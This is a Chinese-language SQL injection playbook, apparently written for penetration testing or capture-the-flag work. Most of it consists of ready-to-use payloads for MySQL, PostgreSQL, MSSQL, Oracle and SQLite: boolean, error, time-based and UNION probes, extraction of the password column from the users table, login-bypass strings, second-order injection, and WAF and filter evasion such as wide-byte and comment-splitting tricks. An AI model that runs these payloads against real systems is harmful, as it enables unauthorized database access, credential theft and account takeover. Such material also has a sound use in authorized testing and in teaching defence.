# SQL Injection Playbook

按“已证明的信号”选策略。不要喷 payload 字典；先用成对差分解释当前证据，再扩展到提取。

## 基线与上下文

保留一条正常请求和一条最小异常请求：

```text
method/url:
param/body:
auth role:
content-type:
baseline status/len/marker/redirect/time:
changed status/len/marker/redirect/time:
```

高价值入口不只在 query/body：登录框、搜索、排序、筛选、分页、导出、注册/资料更新、文件元数据、Host/User-Agent/Referer/X-Forwarded-For 日志、XML/JSON 字段、GraphQL resolver、后台报表和二阶触发页都要按同一套 oracle 验证。

最小探针按上下文分层：

```sql
-- 数字
1 AND 1=1
1 AND 1=2

-- 字符串
' AND '1'='1
' AND '1'='2

-- 括号/注释
') AND ('1'='1
') AND ('1'='2
'-- -
'#

-- 排序/筛选
id
id DESC
(CASE WHEN 1=1 THEN id ELSE title END)
(CASE WHEN 1=2 THEN id ELSE title END)

-- INSERT/UPDATE
a'
a'),('probe','probe
a' WHERE 1=2--
```

如果只有单引号报错，不能直接判定可利用；必须再证明真假、错误、延迟或行数差分。

注释也要按 DBMS 试最小集合：MySQL `-- `、`#`、`/* */`；PostgreSQL/MSSQL/SQLite `--`、`/* */`；Oracle `--`。HQL/ORM 场景可能不支持 SQL 注释，改用补齐右侧表达式。

## Oracle

- 布尔：页面文本、结果数量、登录态、跳转或 JSON 字段稳定变化。
- 错误：true 分支无错、false 分支触发 DB/ORM 错误，或反过来。
- 时间：只在无更好信号时使用；重复测基线和延迟，避免网络抖动误判。
- 排序：同一数据集顺序改变可复现，且 CASE 条件能控制排序列。

盲提取优先二分长度和 ASCII，再按候选字符集收敛：

```sql
AND LENGTH((SELECT database()))>5
AND ASCII(SUBSTR((SELECT database()),1,1))>77
AND ASCII(SUBSTR((SELECT password FROM users LIMIT 1 OFFSET 0),1,1))=97
```

## DBMS 指纹

| DBMS | 指纹/当前值 | 结构入口 | 延迟 |
| --- | --- | --- | --- |
| MySQL | `database()`, `user()`, `version()` | `information_schema.tables`, `information_schema.columns` | `SLEEP(3)` |
| SQLite | `sqlite_version()` | `sqlite_master`, `sqlite_schema` | `randomblob(100000000)` |
| PostgreSQL | `current_database()`, `current_user`, `version()` | `pg_catalog.pg_tables`, `pg_catalog.pg_class` | `pg_sleep(3)` |
| MSSQL | `DB_NAME()`, `SYSTEM_USER`, `@@version` | `sys.tables`, `sys.columns` | `WAITFOR DELAY` |
| Oracle | `USER`, `SYS_CONTEXT('USERENV','CURRENT_SCHEMA')` | `all_tables`, `all_tab_columns` | `DBMS_LOCK.SLEEP(3)` |

常用函数差异：

```sql
-- MySQL / SQLite / Oracle
SUBSTR(x,1,1), LENGTH(x), ASCII(x)

-- PostgreSQL / MSSQL
SUBSTRING(x,1,1), LENGTH(x), ASCII(x)

-- MSSQL 长度
LEN(x)
```

语法差异常决定能否少走弯路：

| 任务 | MySQL | PostgreSQL | MSSQL | Oracle | SQLite |
| --- | --- | --- | --- | --- | --- |
| 拼接 | `CONCAT(a,b)` 或 `a b` | `a||b` | `a+b` | `a||b` | `a||b` |
| 单行限制 | `LIMIT 1 OFFSET 0` | `LIMIT 1 OFFSET 0` | `TOP 1` / `OFFSET` | `ROWNUM=1` | `LIMIT 1 OFFSET 0` |
| 条件 | `IF(c,a,b)` / `CASE` | `CASE` | `IIF` / `CASE` | `CASE` | `CASE` |
| 十六进制字符串 | `0x6162` | `decode('6162','hex')` | `0x6162` | `HEXTORAW` | `X'6162'` |

## UNION 回显

先测列数和可显示列，必要时让原查询变空再 UNION 可控行：

```sql
ORDER BY 1
ORDER BY 2
UNION SELECT NULL
UNION SELECT NULL,NULL
UNION SELECT 1,2,3
```

提取顺序：当前库/用户/版本 -> 表名 -> 列名 -> 目标行。

```sql
-- MySQL
UNION SELECT database(),user(),version()
UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()
UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'

-- SQLite
UNION SELECT name,sql,3 FROM sqlite_master

-- PostgreSQL
UNION SELECT current_database(),current_user,version()
UNION SELECT tablename,schemaname,3 FROM pg_catalog.pg_tables
```

如果 `information_schema` 被拦，换元数据入口：MySQL `mysql.innodb_table_stats` / `sys.schema_table_statistics`，PostgreSQL `pg_catalog`，SQLite `sqlite_master/sqlite_schema`，MSSQL `sys.tables/sys.columns`，Oracle `all_tables/all_tab_columns`。如果列名被拦但列数匹配，可先试 `UNION SELECT * FROM guessed_table` 或用派生表按列序取值。

登录点 UNION 要匹配应用读取的列数、字段顺序和类型。若应用会校验哈希或角色，先构造能通过后续逻辑的最小可控行。

## 盲注与提取

布尔优先，因为证据最稳；时间盲注只作为无回显兜底。

```sql
-- MySQL
AND IF(ASCII(SUBSTR(database(),1,1))>77,SLEEP(3),0)

-- PostgreSQL
AND CASE WHEN ASCII(SUBSTRING(current_database(),1,1))>77 THEN pg_sleep(3) ELSE pg_sleep(0) END IS NULL

-- SQLite
AND CASE WHEN unicode(substr((SELECT name FROM sqlite_master LIMIT 1),1,1))>77 THEN randomblob(100000000) ELSE 1 END

-- MSSQL
IF (ASCII(SUBSTRING(DB_NAME(),1,1))>77) WAITFOR DELAY '00:00:03'
```

错误盲注只在错误差分已稳定时使用：

```sql
AND CASE WHEN 1=1 THEN 1 ELSE 1/0 END
AND CASE WHEN 1=2 THEN 1 ELSE 1/0 END
```

## 登录、二阶与二次查询

登录点不要止步于万能密码；目标是控制“哪一行”进入应用逻辑：

```sql
' OR '1'='1'--
admin'--
' AND 1=0 UNION SELECT 'admin','<compatible_hash>','admin'--
```

如果密码会先哈希再拼 SQL，检查 raw hash、固定哈希、兼容哈希格式和 UNION 可控行；如果用户名经过转义但密码没有，试反斜杠逃逸让第一个字段吞掉分隔引号。

二次查询 SQLi：第一条 SQL 查询出的 `username/id/email/role` 又被拼进第二条 SQL。用 UNION 或布尔条件让第一条返回可控字段，再观察第二条查询、权限或页面分支。

二阶 SQLi：payload 先存入注册资料、昵称、邮箱、地址、搜索历史、文件元数据等位置，再由 profile、后台列表、导出、报表、通知或搜索历史触发。证据必须包含存储请求、触发请求和触发前后差分。

登录或提权成功后，立即检查新功能面：上传、导出、管理页、下载、报表、目标数据读取。上传面重点看文件名、扩展名、Content-Type、魔术字、访问路径和解释器行为；若只做文件名包含判断，验证双扩展名和可执行后缀。

## 非 SELECT 场景

- ORDER BY/字段名：绑定参数保护不了标识符。先证明排序变化，再用 `CASE WHEN` 控制排序或把字段位变成子查询。
- INSERT：注册、留言、上传元数据常见。若不能 SELECT，考虑多行插入、列错位、`ON DUPLICATE KEY UPDATE` 覆盖可登录字段，或把目标数据写进自己可读字段。
- UPDATE/改密：二阶场景中存储的用户名/邮箱可能进入 `WHERE username='stored'`，目标是改到指定用户或读到目标字段。
- LIKE 搜索：`%`、`_`、转义符和大小写排序受 collation 影响；盲提取前先校准大小写是否可区分。
- Routed SQLi：第一处注入的输出被第二条查询消费时，先用十六进制/字符串拼接构造第二阶段 payload。

## 过滤绕过

按阻塞点最小替换，不要一次叠加：

- 空白受限：`/**/`、换行、tab、括号分组。
- 逗号受限：`LIMIT 1 OFFSET 0`，`SUBSTR(x FROM 1 FOR 1)`，或用 `JOIN` 拼列。
- 大小写/关键字：大小写混合、注释切分、等价函数/操作符；单次删除型过滤可测嵌套关键字。
- 引号受限：数字上下文、十六进制、`CHAR()`、PostgreSQL dollar-quote、可控哈希/编码后的字符串。
- 比较受限：`LIKE`、`IN`、`BETWEEN`、`IS NULL`、`GLOB`/`REGEXP`、`NOT BETWEEN`（依 DBMS）。
- 注释受限：用闭合括号、补齐右侧表达式或让原查询自然结束。
- 编码/解析差异：GBK/Shift-JIS 宽字节、XML 实体、URL 双解码、JSON 数字/布尔/null 类型、HQL 的 U+00A0 空白，都只在有对应解析链证据时测试。
- 参数解析：检查重复参数、数组参数、分隔符、JSON 类型变化是否改变后端取值。
- WAF 正则异常：只在判断是 PHP/正则黑名单且响应允许长输入时，测试长串导致匹配失败；先保留短 payload 证据。

## 结论格式

```text
entry_point:
context:
oracle:
dbms_guess:
true_request:
false_request:
signal:
extracted:
next_step:
status: rejected | candidate | verified | goal_achieved
```
